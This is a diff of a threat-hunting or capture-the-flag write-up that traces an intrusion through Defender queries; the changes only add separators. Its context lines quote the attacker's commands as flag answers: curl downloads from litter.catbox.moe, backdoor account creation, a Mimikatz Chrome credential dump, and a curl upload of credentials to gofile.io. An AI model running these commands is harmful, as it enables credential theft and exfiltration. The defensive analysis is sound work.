@@ -60,6 +60,8 @@ Result:
 10.1.0.204
 ```
 
+---
+
 # FLAG 2: LATERAL MOVEMENT - Compromised Credentials
 
 Understanding which accounts attackers use for lateral movement determines the blast radius and guides credential reset priorities
@@ -82,7 +84,7 @@ Result:
 ```
 yuki.tanaka
 ```
-
+---
 
 # FLAG 3: LATERAL MOVEMENT - Target Device
 
@@ -106,6 +108,7 @@ Result:
 ```
 azuki-adminpc
 ```
+---
 
 # FLAG 4: EXECUTION - Payload Hosting Service
 
@@ -167,7 +170,7 @@ Result:
 ```
 litter.catbox.moe
 ```
-
+---
 
 #  FLAG 5: EXECUTION - Malware Download Command
 
@@ -194,6 +197,7 @@ Result
 ```
 "curl.exe" -L -o C:\Windows\Temp\cache\KB5044273-x64.7z https://litter.catbox.moe/gfdb9v.7z
 ```
+---
 
 #  FLAG 6: EXECUTION - Archive Extraction Command
 
@@ -265,6 +269,7 @@ Result:
 ```
 "7z.exe" x C:\Windows\Temp\cache\KB5044273-x64.7z -p******** -oC:\Windows\Temp\cache\ -y
 ```
+---
 
 # FLAG 7: PERSISTENCE - C2 Implant
 
@@ -338,7 +343,7 @@ Result:
 ```
 meterpreter.exe
 ```
-
+---
 
 #  FLAG 8: PERSISTENCE - Named Pipe
 
@@ -424,6 +429,7 @@ Result:
 ```
 \Device\NamedPipe\msf-pipe-5902
 ```
+---
 
 #  FLAG 9: CREDENTIAL ACCESS - Decoded Account Creation
 
@@ -508,6 +514,7 @@ Decoded message using Cyberchef
 ```
 net user yuki.tanaka2 B@ckd00r2024! /add
 ```
+---
 
 # FLAG 10: PERSISTENCE - Backdoor Account
 
@@ -534,6 +541,7 @@ In the decoded message, an account was created
 yuki.tanaka2
 ```
 
+---
 
 # FLAG 11: PERSISTENCE - Decoded Privilege Escalation Command
 
@@ -573,6 +581,7 @@ The message was decoded using CyberChef
 ```
 net localgroup Administrators yuki.tanaka2 /add
 ```
+---
 
 # FLAG 12: DISCOVERY - Session Enumeration
 
@@ -649,6 +658,7 @@ Result:
 qwinsta
 ```
 
+---
 
 #  FLAG 13: DISCOVERY - Domain Trust Enumeration
 
@@ -697,7 +707,6 @@ DeviceProcessEvents
 **Technique:** Valid Accounts  
 **Technique ID:** T1078  
 
-
 ### Data Source
 - Microsoft Defender for Endpoint
 - `DeviceProcessEvents`
@@ -721,7 +730,7 @@ Result:
 ```
 "nltest.exe" /domain_trusts /all_trusts
 ```
-
+---
 
 # FLAG 14: DISCOVERY - Network Connection Enumeration
 
@@ -783,7 +792,6 @@ DeviceProcessEvents
 **Technique:** Remote Services  
 **Technique ID:** T1021  
 
-
 ### Data Source
 - Microsoft Defender for Endpoint
 - `DeviceProcessEvents`
@@ -809,6 +817,7 @@ Result:
 ```
 netstat -ano
 ```
+---
 
 # FLAG 15: DISCOVERY - Password Database Search
 
@@ -939,6 +948,7 @@ Result:
 where /r C:\Users *.kdbx
 ```
 
+---
 
 # FLAG 16: DISCOVERY - Credential File
 
@@ -1024,7 +1034,7 @@ Result:
 ```
 OLD-Passwords.txt
 ```
-
+---
 
 # FLAG 17: COLLECTION - Data Staging Directory
 
@@ -1131,7 +1141,7 @@ Result
 ```
 C:\ProgramData\Microsoft\Crypto\staging
 ```
-
+---
 
 #  FLAG 18: COLLECTION - Automated Data Collection Command
 
@@ -1155,6 +1165,7 @@ Result
 ```
 "Robocopy.exe" C:\Users\yuki.tanaka\Documents\Banking C:\ProgramData\Microsoft\Crypto\staging\Banking /E /R:1 /W:1 /NP
 ```
+---
 
 # FLAG 19: COLLECTION - Exfiltration Volume
 
@@ -1243,6 +1254,7 @@ Results:
 8
 ```
 
+---
 
 # FLAG 20: CREDENTIAL ACCESS - Credential Theft Tool Download
 
@@ -1341,6 +1353,7 @@ Result:
 curl.exe" -L -o m-temp.7z https://litter.catbox.moe/mt97cj.7z
 ```
 
+---
 
 # FLAG 21: CREDENTIAL ACCESS - Browser Credential Theft
 
@@ -1437,6 +1450,7 @@ Result:
 ```
 "m.exe" privilege::debug "dpapi::chrome /in:%localappdata%\Google\Chrome\User Data\Default\Login Data /unprotect" exit
 ```
+---
 
 # FLAG 22: EXFILTRATION - Data Upload Command
 
@@ -1529,6 +1543,7 @@ Result:
 "curl.exe" -X POST -F file=@credentials.tar.gz https://store1.gofile.io/uploadFile
 ```
 
+---
 
 # FLAG 23: EXFILTRATION - Cloud Storage Service
 
@@ -1556,6 +1571,8 @@ Result:
 ```
 gofile.io
 ```
+
+---
 
 # FLAG 24: EXFILTRATION - Destination Server
 
@@ -1649,6 +1666,7 @@ Result:
 ```
 45.112.123.227
 ```
+---
 
 # FLAG 25: CREDENTIAL ACCESS - Master Password Extraction
 
@@ -1741,6 +1759,8 @@ Result:
 ```
 KeePass-Master-Password.txt
 ```
+---
+---
 
 ##  Recommendations
 
